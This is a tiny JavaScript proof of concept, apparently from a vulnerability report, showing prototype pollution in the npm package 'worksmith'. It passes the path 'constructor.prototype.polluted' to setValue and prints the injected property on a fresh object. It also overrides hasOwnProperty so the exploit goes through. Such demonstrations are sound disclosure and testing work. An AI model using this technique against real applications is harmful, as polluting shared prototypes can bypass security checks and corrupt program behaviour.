Object.prototype.hasOwnProperty = () => true;
const worksmith = require('worksmith');
obj = {};
console.log({}.polluted);
worksmith.setValue({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);